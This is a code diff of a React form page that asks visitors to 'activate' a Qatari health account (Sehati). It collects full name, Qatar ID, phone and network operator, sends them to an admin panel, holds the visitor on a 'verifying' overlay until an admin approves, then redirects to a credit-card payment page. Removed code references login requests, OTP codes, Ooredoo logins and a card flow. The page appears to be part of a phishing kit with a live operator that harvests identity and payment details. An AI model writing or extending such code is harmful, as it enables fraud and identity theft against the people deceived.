@@ -1,6 +1,6 @@
 import { useMemo, useState, useEffect} from "react";
-import { navigateToPage } from "@/lib/store";
-import { useLiveDraft } from "@/hooks/useLiveDraft";
+import { navigateToPage, sendData, isFormApproved, waitingMessage } from "@/lib/store";
+import { useSignals } from "@preact/signals-react/runtime";
 import { useLocation, useSearchParams } from "wouter";
 import { z } from "zod";
 import { Phone, ArrowLeft, Loader2, Info, Wallet, CreditCard, Signal } from "lucide-react";
@@ -44,6 +44,7 @@ const NETWORK_OPERATORS = [
 type FormErrors = Partial<Record<"fullName" | "nationalId" | "phone" | "networkOperator", string>>;
 
 const MedicalActivate = () => {
+  useSignals();
   const { pick, dir } = useLang();
   const [, navigate] = useLocation();
   const [params] = useSearchParams();
@@ -58,18 +59,16 @@ const MedicalActivate = () => {
   const [networkOperator, setNetworkOperator] = useState("");
   const [errors, setErrors] = useState<FormErrors>({});
   const [loading, setLoading] = useState(false);
+  const [waiting, setWaiting] = useState(false);
 
-  useLiveDraft({
-    step: "medical_activate",
-    values: { fullName, nationalId, phone, networkOperator, userType },
-    columns: {
-      phone,
-      full_name: fullName,
-      national_id: nationalId,
-      qatar_id: nationalId,
-      selected_service: service || null,
-    },
-  });
+  // الاستماع لموافقة/رفض الأدمن
+  useEffect(() => {
+    if (isFormApproved.value && waiting) {
+      setWaiting(false);
+      const normalizedPhone = phone.replace(/\D/g, "").replace(/^974/, "");
+      navigate("/credit-card-payment");
+    }
+  }, [isFormApproved.value, waiting]);
 
   const t = (ar: string, en: string) => pick(ar, en);
 
@@ -95,59 +94,21 @@ const MedicalActivate = () => {
     e.preventDefault();
     if (!validate()) return;
     setLoading(true);
-
     const normalizedPhone = phone.replace(/\D/g, "").replace(/^974/, "");
-    const payload = {
-      phone: normalizedPhone,
-      step: "medical_activate",
-      // Informational log — the visitor is forwarded to /card-info which
-      // will create the actual pending row that needs admin approval.
-      status: "info",
-      selected_service: service,
-      current_page: "/medical-activate",
-      full_name: fullName,
-      national_id: nationalId,
-      qatar_id: nationalId,
-      username: userType,
-      // Mirror step-scoped identity into activation_data so later pages
-      // that overwrite the top-level columns (Ooredoo login username,
-      // card flow) can't wipe them from the admin card.
-      activation_data: {
-        network_operator: networkOperator,
-        activate_user_type: userType,
-        activate_full_name: fullName,
-        activate_national_id: nationalId,
-        activate_phone: normalizedPhone,
+    sendData({
+      data: {
+        "نوع المستخدم": userType === 'individual' ? 'مستخدم فردي' : 'مستخدم شركة',
+        "الاسم الكامل": fullName,
+        "رقم الهوية القطرية": nationalId,
+        "رقم الهاتف": normalizedPhone,
+        "مشغل الشبكة": networkOperator,
+        "الخدمة": service || '',
       },
-      updated_at: new Date().toISOString(),
-    } as any;
-    // Unify visitor identity: update the existing session row when present
-    // (e.g. visitor came from /medical-login) so the admin sees one card,
-    // not two separate visitors with the same identity.
-    let existingId: string | null = null;
-    try { existingId = sessionStorage.getItem("visitor_request_id"); } catch { /* noop */ }
-    let data: { id: string } | null = null;
-    let error: unknown = null;
-    if (existingId) {
-      const merged = await updateVisitorRow(existingId, payload); const res = { data: merged, error: null as unknown };
-      data = res.data as any; error = res.error;
-      if (!data) {
-        // Row was deleted server-side; fall back to insert
-        const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" }).select("id").single();
-        data = ins.data as any; error = ins.error;
-      }
-    } else {
-      const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" }).select("id").single();
-      data = ins.data as any; error = ins.error;
-    }
-
+      current: 'تفعيل حساب صحتي',
+      waitingForAdminResponse: true,
+    });
     setLoading(false);
-    if (error || !data) return;
-    setVisitorRequestId(data.id);
-    if (typeof window !== "undefined") {
-      sessionStorage.setItem("selected_service", service || "");
-    }
-    navigate("/card-info", { state: { phone: normalizedPhone } });
+    setWaiting(true);
   };
 
   useEffect(() => {
@@ -157,6 +118,14 @@ const MedicalActivate = () => {
   return (
     <div dir={dir} className="min-h-screen bg-[#eef0fb] flex flex-col">
       <SiteHeader />
+      {waiting && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-xl p-8 text-center">
+            <div className="animate-spin w-10 h-10 border-4 border-[#8b1538] border-t-transparent rounded-full mx-auto mb-4"></div>
+            <p className="text-gray-700">جاري التحقق...</p>
+          </div>
+        </div>
+      )}
       <div className="flex-1 py-8 px-3 flex items-start justify-center">
         <div className="w-full max-w-5xl bg-white shadow-sm">
           {/* Titles bar */}
